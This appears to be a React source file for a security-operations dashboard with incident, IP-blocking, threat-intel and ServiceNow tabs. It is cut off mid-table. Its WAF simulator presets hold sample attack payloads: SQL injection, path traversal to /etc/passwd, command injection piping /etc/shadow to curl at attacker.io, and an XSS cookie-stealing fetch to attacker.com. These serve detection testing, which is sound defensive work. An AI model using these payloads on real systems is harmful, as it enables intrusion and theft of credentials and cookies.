import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Flame,
  Search,
  RefreshCw,
  Lock,
  Unlock,
  Radio,
  FileText,
  Activity,
  CheckCircle2,
  XCircle,
  ExternalLink,
  ChevronRight,
  Eye,
  Zap,
  Clock,
  Send,
  Database,
  Globe,
  Plus,
  Server,
  Layers,
  Terminal,
  Shield,
  HelpCircle,
} from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import {
  SecOpsSummary,
  SecurityIncident,
  SecurityEvent,
  IpReputation,
  ThreatIntelIndicator,
  ServiceNowStatusResponse,
} from '../types';

export const SecOpsPage: React.FC = () => {
  const { apiFetch } = useAuth();

  // Active Tab
  const [activeTab, setActiveTab] = useState<
    'incidents' | 'waf_ips' | 'threat_intel' | 'audit_events' | 'simulator' | 'servicenow'
  >('incidents');

  // Summary telemetry
  const [summary, setSummary] = useState<SecOpsSummary | null>(null);
  const [loadingSummary, setLoadingSummary] = useState(true);

  // Incidents
  const [incidents, setIncidents] = useState<SecurityIncident[]>([]);
  const [loadingIncidents, setLoadingIncidents] = useState(false);
  const [selectedIncident, setSelectedIncident] = useState<SecurityIncident | null>(null);
  const [filterIncStatus, setFilterIncStatus] = useState<string>('ALL');
  const [filterIncSeverity, setFilterIncSeverity] = useState<string>('ALL');
  const [newNote, setNewNote] = useState('');
  const [savingNote, setSavingNote] = useState(false);
  const [actionSuccess, setActionSuccess] = useState<string | null>(null);

  // IP Reputations
  const [ipReputations, setIpReputations] = useState<IpReputation[]>([]);
  const [loadingIps, setLoadingIps] = useState(false);
  const [filterIpStatus, setFilterIpStatus] = useState<string>('ALL');
  const [blockIpModal, setBlockIpModal] = useState<{ open: boolean; ip: string; isPerm: boolean }>({
    open: false,
    ip: '',
    isPerm: false,
  });
  const [blockReason, setBlockReason] = useState('Repeated suspicious activity detected');

  // Threat Intel
  const [threatIntel, setThreatIntel] = useState<ThreatIntelIndicator[]>([]);
  const [loadingTi, setLoadingTi] = useState(false);
  const [newIocModal, setNewIocModal] = useState(false);
  const [newIocType, setNewIocType] = useState('IP');
  const [newIocValue, setNewIocValue] = useState('');
  const [newIocActor, setNewIocActor] = useState('');
  const [newIocCampaign, setNewIocCampaign] = useState('');
  const [newIocConfidence, setNewIocConfidence] = useState(85);
  const [newIocDesc, setNewIocDesc] = useState('');

  // Security Events Audit
  const [events, setEvents] = useState<SecurityEvent[]>([]);
  const [loadingEvents, setLoadingEvents] = useState(false);
  const [filterEvCategory, setFilterEvCategory] = useState<string>('ALL');
  const [filterEvAction, setFilterEvAction] = useState<string>('ALL');
  const [searchEvIp, setSearchEvIp] = useState('');
  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(null);

  // WAF Simulator
  const [simIp, setSimIp] = useState('198.51.100.99');
  const [simMethod, setSimMethod] = useState('POST');
  const [simPath, setSimPath] = useState('/api/resources/finance.csv/query');
  const [simPayload, setSimPayload] = useState("admin' UNION SELECT id, password_hash FROM users WHERE '1'='1");
  const [simulating, setSimulating] = useState(false);
  const [simResult, setSimResult] = useState<any | null>(null);

  // ServiceNow SIR Integration State
  const [snStatus, setSnStatus] = useState<ServiceNowStatusResponse | null>(null);
  const [loadingSn, setLoadingSn] = useState(false);
  const [testSnViolation, setTestSnViolation] = useState('DENY_PURPOSE_MISMATCH');
  const [testSnCaller, setTestSnCaller] = useState('alice');
  const [testSnResource, setTestSnResource] = useState('finance.csv');
  const [testSnAction, setTestSnAction] = useState('query');
  const [testSnPurpose, setTestSnPurpose] = useState('UNAUTHORIZED_SECONDARY_SALE');
  const [testingSn, setTestingSn] = useState(false);
  const [testSnResult, setTestSnResult] = useState<any | null>(null);

  // Inbound Webhook Simulator State
  const [webhookSimNumber, setWebhookSimNumber] = useState('');
  const [webhookSimState, setWebhookSimState] = useState('2');
  const [webhookSimNotes, setWebhookSimNotes] = useState('Analyst investigating suspicious purpose violation.');
  const [sendingInbound, setSendingInbound] = useState(false);

  // Preset Attack Vectors
  const attackPresets = [
    {
      name: 'SQL Injection (Union Exfiltration)',
      ip: '198.51.100.99',
      path: '/api/resources/finance.csv/query',
      method: 'POST',
      payload: "admin' UNION SELECT id, password_hash FROM users WHERE '1'='1",
      category: 'SQLI',
      risk: 95,
    },
    {
      name: 'Path Traversal (System File Leak)',
      ip: '203.0.113.44',
      path: '/api/resources/download',
      method: 'GET',
      payload: '../../../../etc/passwd%00',
      category: 'PATH_TRAVERSAL',
      risk: 85,
    },
    {
      name: 'Command Injection (Remote Execution)',
      ip: '192.0.2.77',
      path: '/api/resources/convert',
      method: 'POST',
      payload: 'sample.csv; cat /etc/shadow | curl https://attacker.io -d @-',
      category: 'COMMAND_INJECTION',
      risk: 100,
    },
    {
      name: 'XSS Attack (Stored Script Injection)',
      ip: '198.51.100.12',
      path: '/api/requests',
      method: 'POST',
      payload: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
      category: 'XSS',
      risk: 75,
    },
    {
      name: 'Legitimate Safe Request (Clean)',
      ip: '127.0.0.1',
      path: '/api/resources/finance.csv/query',
      method: 'POST',
      payload: '{"quarter": "Q3", "limit": 100, "anonymized": true}',
      category: 'CLEAN',
      risk: 0,
    },
  ];

  // Telemetry Fetchers
  const fetchSummary = async () => {
    setLoadingSummary(true);
    try {
      const data = await apiFetch('/api/secops/summary');
      setSummary(data);
    } catch (err) {
      console.error('Failed to load SecOps summary:', err);
    } finally {
      setLoadingSummary(false);
    }
  };

  const fetchIncidents = async () => {
    setLoadingIncidents(true);
    try {
      let url = '/api/secops/incidents';
      const params = new URLSearchParams();
      if (filterIncStatus !== 'ALL') params.append('status', filterIncStatus);
      if (filterIncSeverity !== 'ALL') params.append('severity', filterIncSeverity);
      const q = params.toString();
      if (q) url += `?${q}`;
      const data = await apiFetch(url);
      setIncidents(data.incidents || []);
      if (!selectedIncident && data.incidents && data.incidents.length > 0) {
        setSelectedIncident(data.incidents[0]);
      }
    } catch (err) {
      console.error('Failed to load incidents:', err);
    } finally {
      setLoadingIncidents(false);
    }
  };

  const fetchIncidentDetails = async (id: string) => {
    try {
      const data = await apiFetch(`/api/secops/incidents/${id}`);
      setSelectedIncident(data);
      if (data.servicenow_number && !webhookSimNumber) {
        setWebhookSimNumber(data.servicenow_number);
      }
    } catch (err) {
      console.error('Failed to load incident detail:', err);
    }
  };

  const fetchIpReputations = async () => {
    setLoadingIps(true);
    try {
      let url = '/api/secops/ips';
      if (filterIpStatus !== 'ALL') url += `?status=${filterIpStatus}`;
      const data = await apiFetch(url);
      setIpReputations(data.ips || []);
    } catch (err) {
      console.error('Failed to load IP reputations:', err);
    } finally {
      setLoadingIps(false);
    }
  };

  const fetchThreatIntel = async () => {
    setLoadingTi(true);
    try {
      const data = await apiFetch('/api/secops/threat-intel');
      setThreatIntel(data.indicators || []);
    } catch (err) {
      console.error('Failed to load threat intel:', err);
    } finally {
      setLoadingTi(false);
    }
  };

  const fetchEvents = async () => {
    setLoadingEvents(true);
    try {
      let url = '/api/secops/events?limit=50';
      if (filterEvCategory !== 'ALL') url += `&category=${filterEvCategory}`;
      if (filterEvAction !== 'ALL') url += `&action=${filterEvAction}`;
      if (searchEvIp.trim()) url += `&source_ip=${searchEvIp.trim()}`;
      const data = await apiFetch(url);
      setEvents(data.events || []);
    } catch (err) {
      console.error('Failed to load security events:', err);
    } finally {
      setLoadingEvents(false);
    }
  };

  const fetchServiceNowStatus = async () => {
    setLoadingSn(true);
    try {
      const data = await apiFetch('/api/secops/servicenow/status');
      setSnStatus(data);
    } catch (err) {
      console.error('Failed to load ServiceNow status:', err);
    } finally {
      setLoadingSn(false);
    }
  };

  useEffect(() => {
    fetchSummary();
    fetchServiceNowStatus();
  }, []);

  useEffect(() => {
    if (activeTab === 'incidents') fetchIncidents();
    if (activeTab === 'waf_ips') fetchIpReputations();
    if (activeTab === 'threat_intel') fetchThreatIntel();
    if (activeTab === 'audit_events') fetchEvents();
    if (activeTab === 'servicenow') fetchServiceNowStatus();
  }, [activeTab, filterIncStatus, filterIncSeverity, filterIpStatus, filterEvCategory, filterEvAction]);

  const handleTestServiceNow = async () => {
    setTestingSn(true);
    setTestSnResult(null);
    try {
      const res = await apiFetch('/api/secops/servicenow/test', {
        method: 'POST',
        body: JSON.stringify({
          violation_code: testSnViolation,
          caller_sub: testSnCaller,
          resource_id: testSnResource,
          action: testSnAction,
          declared_purpose: testSnPurpose,
        }),
      });
      setTestSnResult(res);
      setActionSuccess(`ServiceNow SIR Incident opened: ${res.servicenow_number} (${res.incident_id})`);
      fetchServiceNowStatus();
      fetchIncidents();
      fetchSummary();
    } catch (err: any) {
      console.error(err);
    } finally {
      setTestingSn(false);
    }
  };

  const handleSendInboundWebhook = async () => {
    if (!webhookSimNumber.trim()) return;
    setSendingInbound(true);
    try {
      const res = await apiFetch('/api/secops/servicenow/webhook', {
        method: 'POST',
        body: JSON.stringify({
          number: webhookSimNumber.trim(),
          state: webhookSimState,
          work_notes: webhookSimNotes,
          author: 'ServiceNow SecOps Analyst (David Miller)',
        }),
      });
      setActionSuccess(`Inbound webhook processed: ${res.incident_id} updated to ${res.incident_status}`);
      fetchServiceNowStatus();
      fetchIncidents();
      fetchSummary();
    } catch (err: any) {
      console.error(err);
    } finally {
      setSendingInbound(false);
    }
  };

  const handleUpdateIncidentStatus = async (status: string) => {
    if (!selectedIncident) return;
    try {
      await apiFetch(`/api/secops/incidents/${selectedIncident.id}`, {
        method: 'PATCH',
        body: JSON.stringify({
          status,
          note: `Incident status updated to ${status} via SecOps console`,
        }),
      });
      setActionSuccess(`Incident updated to ${status}`);
      fetchIncidentDetails(selectedIncident.id);
      fetchIncidents();
      fetchSummary();
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleAddIncidentNote = async () => {
    if (!selectedIncident || !newNote.trim()) return;
    setSavingNote(true);
    try {
      await apiFetch(`/api/secops/incidents/${selectedIncident.id}`, {
        method: 'PATCH',
        body: JSON.stringify({
          status: selectedIncident.status,
          note: newNote.trim(),
        }),
      });
      setNewNote('');
      fetchIncidentDetails(selectedIncident.id);
    } catch (err: any) {
      console.error(err);
    } finally {
      setSavingNote(false);
    }
  };

  const handleBlockIp = async () => {
    try {
      await apiFetch('/api/secops/ips/block', {
        method: 'POST',
        body: JSON.stringify({
          ip: blockIpModal.ip,
          permanent: blockIpModal.isPerm,
          duration_minutes: blockIpModal.isPerm ? null : 60,
          reason: blockReason,
        }),
      });
      setBlockIpModal({ open: false, ip: '', isPerm: false });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${blockIpModal.ip} has been blocked.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleUnblockIp = async (ip: string) => {
    try {
      await apiFetch('/api/secops/ips/unblock', {
        method: 'POST',
        body: JSON.stringify({ ip, reason: 'Remediated by administrator' }),
      });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${ip} unblocked.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleAllowlistIp = async (ip: string) => {
    try {
      await apiFetch('/api/secops/ips/allowlist', {
        method: 'POST',
        body: JSON.stringify({ ip, reason: 'Trusted corporate infrastructure' }),
      });
      fetchIpReputations();
      fetchSummary();
      setActionSuccess(`IP ${ip} added to allowlist.`);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleCreateIoc = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await apiFetch('/api/secops/threat-intel', {
        method: 'POST',
        body: JSON.stringify({
          type: newIocType,
          value: newIocValue.trim(),
          threat_actor: newIocActor.trim() || null,
          campaign: newIocCampaign.trim() || null,
          confidence: Number(newIocConfidence),
          description: newIocDesc.trim(),
        }),
      });
      setNewIocModal(false);
      setNewIocValue('');
      setNewIocActor('');
      setNewIocCampaign('');
      setNewIocDesc('');
      fetchThreatIntel();
      fetchSummary();
      setActionSuccess('Indicator of Compromise added to threat database.');
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleRunSimulation = async (preset?: any) => {
    setSimulating(true);
    setSimResult(null);
    const ip = preset ? preset.ip : simIp;
    const method = preset ? preset.method : simMethod;
    const path = preset ? preset.path : simPath;
    const payload = preset ? preset.payload : simPayload;

    if (preset) {
      setSimIp(preset.ip);
      setSimMethod(preset.method);
      setSimPath(preset.path);
      setSimPayload(preset.payload);
    }

    try {
      const res = await apiFetch('/api/secops/simulate', {
        method: 'POST',
        body: JSON.stringify({
          source_ip: ip,
          method,
          path,
          payload,
        }),
      });
      setSimResult(res);
      fetchSummary();
      if (activeTab === 'incidents') fetchIncidents();
    } catch (err: any) {
      console.error(err);
    } finally {
      setSimulating(false);
    }
  };

  // Badges with Warm Sand / Porcelain Harmonious Colors
  const getSeverityBadge = (sev: string) => {
    const s = String(sev || '').toUpperCase();
    if (s === 'CRITICAL') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 800,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(185, 28, 28, 0.15)',
            color: '#b91c1c',
            border: '1px solid rgba(185, 28, 28, 0.3)',
          }}
        >
          CRITICAL
        </span>
      );
    }
    if (s === 'HIGH') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 800,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(194, 65, 12, 0.15)',
            color: '#c2410c',
            border: '1px solid rgba(194, 65, 12, 0.3)',
          }}
        >
          HIGH
        </span>
      );
    }
    if (s === 'MEDIUM') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 800,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(180, 83, 9, 0.15)',
            color: '#b45309',
            border: '1px solid rgba(180, 83, 9, 0.3)',
          }}
        >
          MEDIUM
        </span>
      );
    }
    return (
      <span
        style={{
          fontSize: '0.7rem',
          fontWeight: 700,
          padding: '0.2rem 0.5rem',
          borderRadius: '4px',
          background: 'rgba(71, 85, 105, 0.12)',
          color: '#475569',
          border: '1px solid rgba(71, 85, 105, 0.25)',
        }}
      >
        LOW
      </span>
    );
  };

  const getStatusBadge = (status: string) => {
    const st = String(status || '').toUpperCase();
    if (st === 'NEW') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(29, 78, 216, 0.12)',
            color: '#1d4ed8',
            border: '1px solid rgba(29, 78, 216, 0.25)',
          }}
        >
          NEW
        </span>
      );
    }
    if (st === 'INVESTIGATING') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(124, 58, 237, 0.12)',
            color: '#7c3aed',
            border: '1px solid rgba(124, 58, 237, 0.25)',
          }}
        >
          INVESTIGATING
        </span>
      );
    }
    if (st === 'CONTAINED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(180, 83, 9, 0.12)',
            color: '#b45309',
            border: '1px solid rgba(180, 83, 9, 0.25)',
          }}
        >
          CONTAINED
        </span>
      );
    }
    if (st === 'RESOLVED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(21, 128, 61, 0.12)',
            color: '#15803d',
            border: '1px solid rgba(21, 128, 61, 0.25)',
          }}
        >
          RESOLVED
        </span>
      );
    }
    return (
      <span
        style={{
          fontSize: '0.7rem',
          fontWeight: 700,
          padding: '0.2rem 0.5rem',
          borderRadius: '4px',
          background: 'rgba(100, 116, 139, 0.12)',
          color: '#64748b',
          border: '1px solid rgba(100, 116, 139, 0.25)',
        }}
      >
        {st}
      </span>
    );
  };

  const getIpStatusBadge = (status: string) => {
    const s = String(status || '').toUpperCase();
    if (s === 'PERM_BLOCKED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 800,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(185, 28, 28, 0.18)',
            color: '#b91c1c',
            border: '1px solid #b91c1c',
          }}
        >
          PERM BLOCKED
        </span>
      );
    }
    if (s === 'TEMP_BLOCKED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 800,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(194, 65, 12, 0.18)',
            color: '#c2410c',
            border: '1px solid #c2410c',
          }}
        >
          TEMP BLOCKED
        </span>
      );
    }
    if (s === 'FLAGGED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(180, 83, 9, 0.15)',
            color: '#b45309',
            border: '1px solid #b45309',
          }}
        >
          FLAGGED
        </span>
      );
    }
    if (s === 'ALLOWLISTED') {
      return (
        <span
          style={{
            fontSize: '0.7rem',
            fontWeight: 700,
            padding: '0.2rem 0.5rem',
            borderRadius: '4px',
            background: 'rgba(21, 128, 61, 0.15)',
            color: '#15803d',
            border: '1px solid #15803d',
          }}
        >
          ALLOWLISTED
        </span>
      );
    }
    return (
      <span
        style={{
          fontSize: '0.7rem',
          fontWeight: 700,
          padding: '0.2rem 0.5rem',
          borderRadius: '4px',
          background: 'rgba(100, 116, 139, 0.12)',
          color: '#64748b',
          border: '1px solid #cbd5e1',
        }}
      >
        CLEAN
      </span>
    );
  };

  return (
    <div className="page-container" id="secops-page">
      {/* Top Header */}
      <div className="page-header-row">
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.25rem' }}>
            <h1 className="page-title">ServiceNow SecOps & WAF Defense Center</h1>
            <span
              style={{
                fontSize: '0.7rem',
                fontWeight: 800,
                padding: '0.2rem 0.65rem',
                borderRadius: '999px',
                background: 'rgba(185, 28, 28, 0.12)',
                color: 'var(--accent-crimson)',
                border: '1px solid rgba(185, 28, 28, 0.3)',
                letterSpacing: '0.04em',
                textTransform: 'uppercase',
              }}
            >
              Live Gateway Enforcement
            </span>
          </div>
          <p className="page-subtitle">
            Enterprise Security Incident Response (SIR), Threat Intelligence (TISC), WAF Payload Inspection, and Adaptive IP Containment.
          </p>
        </div>

        <button
          onClick={() => {
            fetchSummary();
            if (activeTab === 'incidents') fetchIncidents();
            if (activeTab === 'waf_ips') fetchIpReputations();
            if (activeTab === 'threat_intel') fetchThreatIntel();
            if (activeTab === 'audit_events') fetchEvents();
          }}
          className="btn btn-secondary"
          style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.8rem', padding: '0.5rem 0.85rem' }}
          title="Refresh telemetry"
        >
          <RefreshCw size={14} className={loadingSummary ? 'animate-spin' : ''} />
          <span>Refresh SecOps</span>
        </button>
      </div>

      {actionSuccess && (
        <div
          style={{
            marginBottom: '1.25rem',
            padding: '0.85rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            background: 'rgba(21, 128, 61, 0.1)',
            border: '1px solid rgba(21, 128, 61, 0.3)',
            color: '#15803d',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            fontSize: '0.875rem',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
            <CheckCircle2 size={16} color="#15803d" />
            <span style={{ fontWeight: 600 }}>{actionSuccess}</span>
          </div>
          <button
            onClick={() => setActionSuccess(null)}
            style={{ background: 'none', border: 'none', color: '#15803d', cursor: 'pointer', fontWeight: 700 }}
          >
            ✕
          </button>
        </div>
      )}

      {/* 5 KPI Metric Cards */}
      <div
        style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
          gap: '1rem',
          marginBottom: '1.5rem',
        }}
      >
        <div
          className="glass-panel"
          style={{
            background: '#ffffff',
            border: '1px solid var(--border-subtle)',
            borderLeft: '4px solid var(--accent-crimson)',
            padding: '1.1rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
              Active Incidents
            </span>
            <Flame size={16} color="var(--accent-crimson)" />
          </div>
          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
            {loadingSummary ? '...' : summary?.active_incidents ?? 0}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--accent-crimson)', fontWeight: 600, marginTop: '0.35rem' }}>
            ServiceNow SIR Queue
          </div>
        </div>

        <div
          className="glass-panel"
          style={{
            background: '#ffffff',
            border: '1px solid var(--border-subtle)',
            borderLeft: '4px solid #c2410c',
            padding: '1.1rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
              Blocked IPs
            </span>
            <Lock size={16} color="#c2410c" />
          </div>
          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
            {loadingSummary ? '...' : summary?.blocked_ips ?? 0}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
            WAF Restricted
          </div>
        </div>

        <div
          className="glass-panel"
          style={{
            background: '#ffffff',
            border: '1px solid var(--border-subtle)',
            borderLeft: '4px solid #b45309',
            padding: '1.1rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
              Attacks Blocked
            </span>
            <AlertTriangle size={16} color="#b45309" />
          </div>
          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
            {loadingSummary ? '...' : summary?.attacks_detected ?? 0}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
            SQLi, XSS & Injections
          </div>
        </div>

        <div
          className="glass-panel"
          style={{
            background: '#ffffff',
            border: '1px solid var(--border-subtle)',
            borderLeft: '4px solid #7c3aed',
            padding: '1.1rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
              Threat Intel IOCs
            </span>
            <Radio size={16} color="#7c3aed" />
          </div>
          <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.1 }}>
            {loadingSummary ? '...' : (summary?.active_threat_intel_count ?? (summary as any)?.threat_indicators_count ?? 0)}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.35rem' }}>
            TISC Indicator Feeds
          </div>
        </div>

        <div
          className="glass-panel"
          style={{
            background: '#ffffff',
            border: '1px solid var(--border-subtle)',
            borderLeft: '4px solid #15803d',
            padding: '1.1rem 1.25rem',
            borderRadius: 'var(--radius-md)',
            boxShadow: '0 2px 6px rgba(0,0,0,0.03)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
            <span style={{ fontSize: '0.72rem', fontWeight: 800, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
              ServiceNow Sync
            </span>
            <Activity size={16} color="#15803d" />
          </div>
          <div style={{ fontSize: '1.35rem', fontWeight: 800, color: '#15803d', lineHeight: 1.3, marginTop: '0.1rem' }}>
            {snStatus?.mock_mode ? 'Mock Active' : 'Connected'}
          </div>
          <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontWeight: 600, marginTop: '0.2rem' }}>
            Bi-directional Webhook
          </div>
        </div>
      </div>

      {/* Tab Bar */}
      <div
        style={{
          display: 'flex',
          alignItems: 'center',
          gap: '0.5rem',
          borderBottom: '1px solid var(--border-subtle)',
          paddingBottom: '0.75rem',
          marginBottom: '1.5rem',
          overflowX: 'auto',
        }}
      >
        {[
          { id: 'incidents', label: 'Incident Response (SIR)', count: incidents.length },
          { id: 'waf_ips', label: 'WAF IP Containment', count: ipReputations.length },
          { id: 'threat_intel', label: 'Threat Intelligence (TISC)', count: threatIntel.length },
          { id: 'audit_events', label: 'Security Audit Log' },
          { id: 'simulator', label: 'Interactive WAF Simulator' },
          { id: 'servicenow', label: 'ServiceNow Integration' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`btn btn-sm ${activeTab === tab.id ? 'btn-primary' : 'btn-secondary'}`}
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '0.4rem',
              whiteSpace: 'nowrap',
              fontSize: '0.825rem',
              fontWeight: activeTab === tab.id ? 700 : 500,
            }}
            id={`secops-tab-${tab.id}`}
          >
            <span>{tab.label}</span>
            {tab.count !== undefined && (
              <span
                style={{
                  fontSize: '0.7rem',
                  padding: '0.1rem 0.4rem',
                  borderRadius: '999px',
                  background: activeTab === tab.id ? 'rgba(255,255,255,0.25)' : 'var(--bg-secondary)',
                  color: activeTab === tab.id ? '#ffffff' : 'var(--text-secondary)',
                }}
              >
                {tab.count}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* TAB 1: INCIDENTS (SIR) */}
      {activeTab === 'incidents' && (
        <div style={{ display: 'grid', gridTemplateColumns: selectedIncident ? '1.2fr 1fr' : '1fr', gap: '1.5rem' }}>
          {/* Incidents Table */}
          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <Flame size={18} color="var(--accent-crimson)" />
                <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                  ServiceNow SIR Incidents
                </h3>
              </div>

              {/* Filters */}
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <select
                  value={filterIncStatus}
                  onChange={(e) => setFilterIncStatus(e.target.value)}
                  style={{
                    fontSize: '0.78rem',
                    padding: '0.35rem 0.6rem',
                    borderRadius: 'var(--radius-sm)',
                    border: '1px solid var(--border-subtle)',
                    background: 'var(--bg-primary)',
                  }}
                >
                  <option value="ALL">All Statuses</option>
                  <option value="NEW">New</option>
                  <option value="INVESTIGATING">Investigating</option>
                  <option value="CONTAINED">Contained</option>
                  <option value="RESOLVED">Resolved</option>
                </select>

                <select
                  value={filterIncSeverity}
                  onChange={(e) => setFilterIncSeverity(e.target.value)}
                  style={{
                    fontSize: '0.78rem',
                    padding: '0.35rem 0.6rem',
                    borderRadius: 'var(--radius-sm)',
                    border: '1px solid var(--border-subtle)',
                    background: 'var(--bg-primary)',
                  }}
                >
                  <option value="ALL">All Severities</option>
                  <option value="CRITICAL">Critical</option>
                  <option value="HIGH">High</option>
                  <option value="MEDIUM">Medium</option>
                  <option value="LOW">Low</option>
                </select>
              </div>
            </div>

            {loadingIncidents ? (
              <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
                Loading security incidents...
              </div>
            ) : incidents.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
                No incidents reported matching criteria.
              </div>
            ) : (
              <div style={{ overflowX: 'auto' }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                  <thead>
                    <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                      <th style={{ padding: '0.65rem 0.5rem' }}>Incident ID</th>
                      <th style={{ padding: '0.65rem 0.5rem' }}>Title</th>
                      <th style={{ padding: '0.65rem 0.5rem' }}>Severity</th>
                      <th style={{ padding: '0.65rem 0.5rem' }}>Status</th>
                      <th style={{ padding: '0.65rem 0.5rem' }}>ServiceNow #</th>
                      <th style={{ padding: '0.65rem 0.5rem' }}>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {incidents.map((inc) => {
                      const isSel = selectedIncident?.id === inc.id;
                      return (
                        <tr
                          key={inc.id}
                          onClick={() => fetchIncidentDetails(inc.id)}
                          style={{
                            borderBottom: '1px solid var(--border-subtle)',
                            cursor: 'pointer',
                            background: isSel ? 'var(--bg-secondary)' : 'transparent',
                            transition: 'background var(--transition-fast)',
                          }}
                        >
                          <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--text-primary)' }}>
                            {inc.id}
                          </td>
                          <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600, color: 'var(--text-primary)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {inc.title}
                          </td>
                          <td style={{ padding: '0.65rem 0.5rem' }}>{getSeverityBadge(inc.severity)}</td>
